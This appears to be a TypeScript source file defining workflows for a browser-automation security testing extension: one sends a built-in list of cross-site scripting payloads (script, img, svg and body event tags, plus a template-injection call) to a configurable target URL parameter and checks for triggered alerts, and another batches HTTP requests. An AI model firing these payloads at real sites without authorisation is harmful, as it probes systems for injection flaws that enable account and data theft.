/**
 * Batch Operations Workflow - Parallel execution for security testing
 */

import {
  createWorkflow,
  parallelNode,
  sequenceNode,
  type WorkflowExecutionContext,
} from '@jshookmcp/extension-sdk';

// Default XSS payloads for batch testing
const DEFAULT_XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<body onload=alert(1)>',
  '{{constructor.constructor("alert(1)")()}}',
];

export const batchXssTestWorkflow = createWorkflow('workflow.batch-xss-test.v1', 'Batch XSS Test')
  .description('Test multiple XSS payloads in parallel against a target URL')
  .buildGraph((ctx: WorkflowExecutionContext) => {
    const baseUrl = ctx.getConfig<string>('baseUrl', '');
    const parameter = ctx.getConfig<string>('parameter', 'q');
    const payloads = ctx.getConfig<string[]>('payloads', DEFAULT_XSS_PAYLOADS);
    const maxConcurrency = ctx.getConfig<number>('maxConcurrency', 5);

    const root = parallelNode('batch-xss').maxConcurrency(maxConcurrency);

    for (const [i, payload] of payloads.entries()) {
      root.step(
        sequenceNode(`xss-${i}`)
          .tool('navigate', 'page_navigate', {
            input: { url: `${baseUrl}?${parameter}=${encodeURIComponent(payload)}` },
          })
          .tool('check-alert', 'page_evaluate', {
            input: {
              expression: 'window.alertTriggered || document.body.innerHTML.includes("<script>")',
            },
          })
          .tool('screenshot', 'page_screenshot', {
            input: { path: `artifacts/xss-${i}.png` },
          }),
      );
    }

    return root;
  })
  .onFinish((ctx: WorkflowExecutionContext, result: unknown) => {
    const results = Array.isArray(result) ? result : [];
    const success = results.filter((r) => r?.success).length;
    ctx.emitMetric('xss.detected', success, 'counter');
  })
  .build();

export const batchRequestWorkflow = createWorkflow('workflow.batch-request.v1', 'Batch Request')
  .description('Send multiple HTTP requests in parallel')
  .buildGraph((ctx: WorkflowExecutionContext) => {
    const urls = ctx.getConfig<string[]>('urls', []);
    const method = ctx.getConfig<string>('method', 'GET');
    const maxConcurrency = ctx.getConfig<number>('maxConcurrency', 10);

    const root = parallelNode('batch-request').maxConcurrency(maxConcurrency);

    for (const [i, url] of urls.entries()) {
      root.step(
        sequenceNode(`request-${i}`)
          .tool('fetch', 'network_replay_request', {
            input: { url, methodOverride: method },
          }),
      );
    }

    return root;
  })
  .build();

export default [batchXssTestWorkflow, batchRequestWorkflow];
